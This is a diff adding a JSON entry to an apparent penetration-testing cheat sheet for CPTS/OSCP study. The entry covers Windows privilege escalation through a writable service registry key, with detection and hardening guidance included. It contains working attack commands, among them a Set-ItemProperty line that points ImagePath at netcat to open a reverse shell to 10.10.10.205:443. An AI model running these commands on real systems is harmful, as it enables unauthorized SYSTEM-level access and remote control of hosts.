@@ -1,0 +1,82 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "accesschk",
+    "powershell"
+  ],
+  "tags": [
+    "registry",
+    "service",
+    "imagepath"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Weak Permissions",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Find services with weak registry ACLs",
+      "command": "accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services"
+    },
+    {
+      "label": "Set ImagePath to your payload",
+      "command": "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\""
+    }
+  ],
+  "notes": "=== Weak Registry ACL — Service ImagePath Modification ===\nWrite access to service registry key allows modifying ImagePath to point to malicious binary.\n\n=== TECHNICAL MECHANISM ===\nService configuration is stored in: HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\nIf a low-privilege user can write to this key, they can modify ImagePath directly\nThis bypasses the service object's own ACL in SCM — registry ACL is separate from service DACL.\n\n=== DISCOVERY ===\n  accesschk.exe -kvuqsw hklm\\system\\currentcontrolset\\services\n  Flags: -k registry key, -v verbose, -u suppress errors, -q suppress banner, -s recursive, -w writable only\n  Look for: low-privilege principals (Users, Authenticated Users) with write access\n\nManual check for specific service:\n  accesschk.exe -kvuq hklm\\system\\currentcontrolset\\services\\<ServiceName>\n  Get-Acl \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\" | Format-List\n\n=== ATTACK FLOW ===\n1. Identify vulnerable key: accesschk sweep\n2. Read current ImagePath (for cleanup):\n   reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\" /v ImagePath\n3. Replace with attacker command:\n   Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\" -Name ImagePath -Value \"C:\\Tools\\shell.exe\"\n   OR: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\" /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Tools\\shell.exe\" /f\n4. Restart service:\n   sc stop <ServiceName>; sc start <ServiceName>\n5. Cleanup:\n   Set-ItemProperty ... -Value \"C:\\original\\path\\service.exe\"\n\n=== DIFFERENCE FROM SERVICE OBJECT ACL ===\nRegistry ACL: modifies HKLM directly (requires registry write permission, bypasses SCM)\nService object ACL: uses sc config via Service Control Manager (requires service DACL write)\nBoth achieve the same result (arbitrary command as SYSTEM on service start)\n\n=== CHAINING CONTEXT ===\nWeak registry ACL → ImagePath = reverse shell → SYSTEM → lateral movement\nThird-party installers that set wide-open ACLs on service registry keys\nCombine with other findings: may need to disable AV before modifying registry\n\n=== WHAT TO LOOK FOR ===\nBUILTIN\\Users or Everyone with KEY_WRITE on any service registry key\nNT AUTHORITY\\Authenticated Users with write = any domain user can exploit\nServices with non-standard registry key permissions (inherited from parent with wrong ACLs)",
+  "references": [
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpup-audit",
+      "note": "Where the finding came from.",
+      "rel": "prereq"
+    },
+    {
+      "id": "weak-service-acl-binpath",
+      "note": "Equivalent attack via sc config.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "weak-registry-imagepath",
+  "name": "Weak Permissions - Writable Service Registry (ImagePath)",
+  "command": "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<service> -Name ImagePath -Value \"C:\\path\\nc.exe -e cmd.exe <lhost> <lport>\"",
+  "description": "If a service's registry key is writable (accesschk -kvuqsw on hklm\\System\\CurrentControlSet\\services), change ImagePath directly to your payload command and restart the service.",
+  "opsec": "loud",
+  "mitre": [
+    "T1574.011"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Service configuration is stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The ImagePath value defines the binary to execute. If a non-admin user has write access to a service's registry key (discovered via accesschk), they can modify ImagePath to point to an arbitrary binary. On next service start, that binary executes in the service account's context (often SYSTEM).",
+    "prerequisites": "Write access on a service registry key (SET_VALUE or KEY_ALL_ACCESS for non-admin user). The service must be startable/restartable. accesschk to identify writable keys.",
+    "impact": "Arbitrary code execution as the service account (SYSTEM or privileged account) via registry ImagePath modification.",
+    "detection": "accesschk on HKLM\\SYSTEM\\CurrentControlSet\\Services by standard user. Set-ItemProperty on a service ImagePath key by non-admin (Event 4657: registry key modified). Service restart with unexpected binary. Sysmon Event 13: registry value set on service ImagePath by non-admin.",
+    "artifacts": "Registry: ImagePath modified by non-admin (Sysmon Event 13) | Security event 4657: registry key write on service key | Process: new binary executed in service context",
+    "prevention": "Audit registry ACLs on all service keys. Restrict to SYSTEM and Administrators only. Use accesschk.exe to audit: `accesschk.exe -kvuqsw HKLM\\System\\CurrentControlSet\\Services`. Apply CIS Benchmark registry hardening.",
+    "misconfiguration": "Third-party application or misconfigured group policy grants non-admin users WRITE access on service registry keys. Default service keys normally restricted, but custom application services may be misconfigured.",
+    "vulnerable_config": "# Writable service registry key:\naccesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\services\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc -> BUILTIN\\Users: KEY_ALL_ACCESS\n\n# Exploit:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc' -Name ImagePath -Value 'C:\\Tools\\nc.exe attacker 443 -e cmd'\nsc start VulnSvc  # executes netcat as SYSTEM",
+    "secure_config": "# Audit service registry ACLs:\naccesschk.exe -kvuqsw HKLM\\System\\CurrentControlSet\\Services > svc_reg_acls.txt\n\n# Fix permissive ACL on specific service key:\n$acl = Get-Acl 'HKLM:\\System\\CurrentControlSet\\Services\\VulnSvc'\n$acl.SetAccessRuleProtection($true, $false)\nSet-Acl 'HKLM:\\System\\CurrentControlSet\\Services\\VulnSvc' $acl\n\n# Restrict to SYSTEM + Administrators only",
+    "sources": [
+      "HTB M26",
+      "MITRE T1574.011"
+    ]
+  }
+}
